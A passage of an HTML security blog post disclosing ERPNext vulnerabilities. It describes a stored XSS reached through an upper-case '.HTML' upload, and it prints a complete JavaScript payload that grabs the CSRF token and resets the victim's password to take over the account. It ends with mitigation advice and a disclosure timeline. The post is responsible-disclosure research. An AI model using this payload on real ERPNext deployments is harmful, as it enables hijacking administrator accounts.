xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 2018 1258'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAGCAYAAAD68A/GAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAvUlEQVQImU2Pi0rDQBRE99t91JLeNq1JFBTEYiGFolgbTXz9UZI2a8Rkt/bIRgsODAMzcGDUsQTIJORExtwtE/K8YL3ZUJQleVFSac3t/QrlDX3k9IzDvpCkL/zXbvebrlcHniCTiN7AJ31+w21fTYOxtrPTMklRRxIy+iOuHjNaY9AfNbr+pNI1pm1JnjKUI+2J2et7RzDGYu2W762lamDxkKE8352JGPghwfkl09mc65u483QWE13FSHDBD5h1xI7iJYs0AAAAAElFTkSuQmCC'%3E%3C/image%3E%3C/svg%3E&#34;)"></picture></p><p>Users can upload their profile images from devices:</p><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p6-1920w.webp 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p6-1280w.webp 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p6-840w.webp 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p6-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p6-1920w.png 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p6-1280w.png 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p6-840w.png 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p6-320w.png 320w" type="image/png"><img alt="" src="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p6-1920w.png" height="1150" width="1330" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 1330 1150'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAHCAYAAAA1WQxeAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAtElEQVQImU2NXQvBYBiG3x/sD/gBO3CiOCD5KjIlYpvv8jPYVjSUlER7mTFxaW+Rq57u57pPbpEvVlmuPOa2w8JxsR2X+cLBW29IZ3MIczAm5v1+qYz5fvVmC9E1B0o2B4l33HPce5y2O9VVajqiZw2VnGWAvAXcggtXX6qu1mgiOoalJAxDokfE/REhpc/Wh0xJR4yns9/2P0+gUG8jtFSa/mhCu2vS6VnqDNOi3BqRSGp8AGm2xX9LYuOWAAAAAElFTkSuQmCC'%3E%3C/image%3E%3C/svg%3E&#34;)"></picture></p><p>When uploading files, the front-end will check the file name to ensure it's an image(.png, .jpg, and so on). But, the back-end has no such check, so we can upload an HTML file by intercepting the request and changing the file extension to <code>.html</code>.</p><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p7-1920w.webp 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p7-1280w.webp 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p7-840w.webp 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p7-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p7-1920w.png 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p7-1280w.png 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p7-840w.png 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p7-320w.png 320w" type="image/png"><img alt="" src="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p7-1920w.png" height="1640" width="2066" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 2066 1640'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAHCAYAAADam2dgAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAu0lEQVQYlR3K6XKDIAAAYd7//UymnSpqPBHwSDgM2O2k+/ObFVX1QLYT0Tn4vRhnQy0bRqUJIbDuT4T87qluJaYb8NuONTtfRYN+DJhxYLcWUZYDUrYoveC8w9ont2JkGhUheN4pfSaFrHvW1RJjwJiDe9HT1AP7thFjROjeYPoZ/3qRcsa9Ik2n6czEdmzklBFRKULbcC4LVwj/+FMuTIciXIFPImiDq2tOa7nOk/xOlFIz2xWfPPnK/AGbiu30NMs74AAAAABJRU5ErkJggg=='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture></p><p>But unfortunately, we can't directly open the HTML file because of the <code>Content-Disposition</code> header:</p><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p8-1920w.webp 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p8-1280w.webp 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p8-840w.webp 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p8-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p8-1920w.png 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p8-1280w.png 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p8-840w.png 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p8-320w.png 320w" type="image/png"><img alt="" src="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p8-1920w.png" height="794" width="2068" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 2068 794'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAAFCAYAAACeuGYRAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAxUlEQVQYlT2M0U6DMAAA+f9P0wfjyIQJS6EUJ2UtjLaMgfSMe/CSe7rkkloIUnFBG8vyWFi3jX3fUd89QlSYcUL1Az/rgzHc0WYgqcoLx9cMcTwzNi1eG+JyxwyBw3tBkWdo3bEsCzHu/JGIsqPMGqRoMJ3m2mnm4HE3R/qSk7+lqPMH8zwTY3yaSPlFVTcM44jzjts04dyEHSayXHM6aYqyRUqJtRbvPUnx2ZEeFEopQgjP47ZtuCnQ1lf63mGN+2/ruvIL+eLz5WsqU8UAAAAASUVORK5CYII='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture></p><p>Because of the header, the browser will download the HTML page instead of opening it.</p><p>After playing around with the feature for a while, we found that it can be bypassed by using the upper-case extension <code>.HTML</code>:</p><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p9-1920w.webp 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p9-1280w.webp 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p9-840w.webp 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p9-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p9-1920w.png 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p9-1280w.png 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p9-840w.png 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p9-320w.png 320w" type="image/png"><img alt="" src="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p9-1920w.png" height="858" width="2070" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 2070 858'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAFCAYAAABxeg0vAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAtklEQVQImR2NwU6EMAAF+f8/08SLWVcFUgtIl0pLlwVaKsUxMMlcJnl5WS0l71LR94Y1BH5jJISVohBo1dL+GIL3LGukM45M5IrryweqrJlumuBG9m0j/6x5fXpGipJl8ex74iATpUEUHbrrmR8T87wAfzT1wOXyTVW1WGsJIZBSIpOy4dDaAXe/MwwD42OkqSyitMivHqVu58h7T1bkmutbg9bdGQ5T2hjdRG8dxll88MQYz4d/iuDhk2NA4IoAAAAASUVORK5CYII='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture></p><p>Now, we have an easy XSS. On the <a href="https://erpnext.com/security" rel="noopener noreferrer" target="_blank">security page</a> of ERPNext, it clearly states that:</p><blockquote><p>Please Note: XSS and HTML Injections won't be accepted.</p></blockquote><p>I think it's fine for some cases because pop-up an alert makes no harm, right? But what if we find a way to escalate it to another vulnerability with bigger impact?</p><p>Surprisingly, in ERPNext, the user doesn't need to input the old password to change to a new password:</p><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p10-1920w.webp 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p10-1280w.webp 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p10-840w.webp 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p10-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p10-1920w.png 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p10-1280w.png 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p10-840w.png 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p10-320w.png 320w" type="image/png"><img alt="" src="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p10-1920w.png" height="440" width="1424" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 1424 440'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAECAYAAAC+0w63AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAX0lEQVQImY2O3QqAIAyFff/3zCszms7cSE9MsBsJGnwwxs6Py5kRjwOUEnrvv3EnETbvEcI+Dl+zCGsVECVwuSCiqCKoomN/UV1MXSw3MhcwF1htw2qbgT231gZTOBMf+ifcFgCdatMAAAAASUVORK5CYII='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture></p><p>So, we can write a script to automatically update the password for the victim user, like this:</p><pre class="language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><br>  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><br>    <span class="token comment">// get user id from cookie</span><br>    <span class="token keyword">const</span> userId <span class="token operator">=</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token language-regex regex-source">user_id=([^;]+)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><br>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'user id:'</span><span class="token punctuation">,</span> userId<span class="token punctuation">)</span><br><br>    <span class="token comment">// get csrf token first</span><br>    <span class="token keyword">const</span> html <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/app'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br>    <span class="token keyword">const</span> token <span class="token operator">=</span> html<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token language-regex regex-source">csrf_token = "(.+)";</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><br>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'csrf token:'</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span><br><br>    <span class="token comment">// get user doc</span><br>    <span class="token keyword">const</span> json <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/api/method/frappe.desk.form.load.getdoc?doctype=User&name='</span><span class="token operator">+</span>userId<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token operator">=></span>res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br>    <span class="token keyword">const</span> docs <span class="token operator">=</span> json<span class="token punctuation">.</span>docs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><br>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>docs<span class="token punctuation">)</span><br>    <br>    <span class="token comment">// just random strong password</span><br>    docs<span class="token punctuation">.</span>new_password <span class="token operator">=</span> <span class="token string">'WIofjg249hq@!32a'</span><br><br>    formBody <span class="token operator">=</span> <span class="token string">'doc='</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>docs<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&action=Save'</span><br><br>    <span class="token comment">// update password</span><br>    <span class="token keyword">const</span> resp <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/api/method/frappe.desk.form.save.savedocs'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><br>      method<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span><br>      headers<span class="token operator">:</span> <span class="token punctuation">{</span><br>        <span class="token string">'X-Frappe-Csrf-Token'</span><span class="token operator">:</span> token<span class="token punctuation">,</span><br>        <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/x-www-form-urlencoded;charset=UTF-8'</span><br>      <span class="token punctuation">}</span><span class="token punctuation">,</span><br>      body<span class="token operator">:</span> formBody<br>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>    <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> resp<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><br>  <span class="token punctuation">}</span><br><br>  <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><br></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>When the victim user opens this page, their password will be updated.</p><p>So, as a malicious actor, I can upload the above content to the server, then send the URL to the admin. After the admin opens the page, I can take over his account because I know his password.</p><p>We successfully escalate from XSS to account takeover vulnerability.</p><h3 id="mitigation-2"><a href="#mitigation-2" class="direct-link">#</a> Mitigation</h3><p>Before a new patched version release, we suggest that:</p><ol><li>Be careful before opening any links hosted on ERPNext server, or using incognito mode to visit the link</li></ol><h2 id="conclusion"><a href="#conclusion" class="direct-link">#</a> Conclusion</h2><p>The latest version of ERPNext is vulnerable to both SSRF and XSS which can lead to account takeover. By exploiting SSRF, a malicious actor may read credentials from cloud metadata and escalate to RCE.</p><p>Both vulnerabilities require a low-privileged authenticated user to perform the attack.</p><p>There is no patch for the vulnerabilities at the time of writing. So we suggest that the user should be careful before the patch release.</p><h2 id="disclosure-timeline"><a href="#disclosure-timeline" class="direct-link">#</a> Disclosure Timeline</h2><p><code>2021-11-25</code> Reported vulnerabilities via the <a href="https://erpnext.com/security" rel="noopener noreferrer" target="_blank">official form</a><br><code>2021-12-15</code> Follow up, they said they are working on the fix<br><code>2022-01-03</code> Follow up again, they said it's in the development phase<br><code>2022-02-14</code> Follow up again, no response<br><code>2022-02-23</code> 90 days since the initial report<br><code>2022-03-10</code> Follow up again, no response<br><code>2022-03-24</code> Ask for the updates, if there is no response we will publish the details in 14 days, no response<br><code>2022-04-06</code> Public disclosure</p><div class="article-footer"><a href="https://tech-blog.cymetrics.io/en/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/" on-click="share"><img alt="Share" src="/img/icons/icon_external link hyperlink.svg" height="24" width="24">Share this post</a></div><div><p style="font-weight: bold;">Tag</p><div class="post-tags"><a href="/en/tags/postsen/" class="post-tag">#postsEn</a> <a href="/en/tags/security/" class="post-tag">#Security</a></div><p style="font-weight: bold;">Recommendation</p><ol><li><a href="/en/posts/nick/exchange_en/">How to Choose a Safe Exchange</a></li><li><a href="/en/posts/nick/data-leakage_en/">Basic Awareness of Hacking Prevention: Data Protection</a></li><li><a href="/en/posts/cymetrics/critical-java-0day-spring4shell/">Spring4shell - a new critical RCE vulnerability found in Java Spring Framework</a></li><li><a href="/en/posts/huli/why-can-i-only-reset-password/">Why can I only reset the password when I forget it and the system couldn’t tell me my old password?</a></li><li><a href="/en/posts/huli/log4j-and-log4shell/">Understanding Log4j and Log4Shell Vulnerabilities from Surveillance Cameras</a></li></ol></div><div class="article-author"><img alt="huli" src="/img/authors/huli_logo.jpg" class="article-author__img" data-deopt="true"><div class="article-author__info"><div class="article-author__title">Author</div><div class="article-author__author"><a href="/en/posts/huli">huli</a></div><div class="article-author__intro">Act as a bridge between Front-end and Security world</div></div></div><p style="font-weight: bold;">Discussion(login required)</p><script async="" src="https://utteranc.es/client.js" crossorigin="anonymous" id="utterance-script" issue-term="title" label="utterance" repo="cymetrics/blog" theme="github-light"></script><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"SSRF and Account Takeover via XSS in ERPNext (0-day)","image":["https://tech-blog.cymetrics.io/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p1-1920w.png","https://tech-blog.cymetrics.io/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p2-1920w.png","https://tech-blog.cymetrics.io/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p3-1920w.png","https://tech-blog.cymetrics.io/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p4-1920w.png","https://tech-blog.cymetrics.io/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p5-1920w.png","https://tech-blog.cymetrics.io/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p6-1920w.png","https://tech-blog.cymetrics.io/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p7-1920w.png","https://tech-blog.cymetrics.io/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p8-1920w.png","https://tech-blog.cymetrics.io/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p9-1920w.png","https://tech-blog.cymetrics.io/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p10-1920w.png","https://tech-blog.cymetrics.io/img/icons/icon_external link hyperlink.svg","https://tech-blog.cymetrics.io/img/authors/huli_logo.jpg"],"author":{"@type":"Person","name":"huli"},"publisher":{"@type":"Organization","name":"Cymetrics Tech Blog","url":"https://tech-blog.cymetrics.io","logo":{"@type":"ImageObject","url":"https://tech-blog.cymetrics.io/img/favicon/favicon-512x512.png","width":512,"height":512}},"url":"https://tech-blog.cymetrics.io/en/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/","mainEntityOfPage":"https://tech-blog.cymetrics.io/en/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/","datePublished":"2022-04-06","dateModified":"2022-12-07","description":"ERPNext is a very popular open-source ERP(Enterprise Resource Planning) software built on Frappe Framework. Last December, we found two..."}</script></article></main><footer><div class="footer-logos"><a href="https://www.facebook.com/cymetrics" rel="noopener noreferrer" target="_blank"><img alt="facebook" src="/img/icons/icon_social media_facebook.svg" height="30" width="30"></a><a href="https://www.linkedin.com/company/cymetrics" rel="noopener noreferrer" target="_blank"><img alt="linkedin" src="/img/icons/icon_social media_linkedln.svg" height="30" width="30"></a><a href="https://tech-blog.cymetrics.io/feed/feed.xml" rel="noreferrer noopener" target="_blank"><img alt="rss feed" src="/img/icons/rss-feed.svg" height="30" width="30"></a></div><div class="copyright">© 2021 Cymetrics Tech Blog, based on <a href="https://github.com/google/eleventy-high-performance-blog" rel="noopener noreferrer" target="_blank">eleventy-high-performance-blog</a>. <a href="https://oneinfinity.global/" rel="noopener noreferrer" target="_blank">OneInfinity</a></div></footer><script>const menuBtn = document.querySelector('.menu__btn')
      menuBtn.addEventListener('click', function() {
        document.querySelector('body').classList.toggle('lock')
        menuBtn.classList.toggle('menu__btn--close');
        document.querySelector('.nav__links').classList.toggle('nav__links--open')
      })</script></body></html>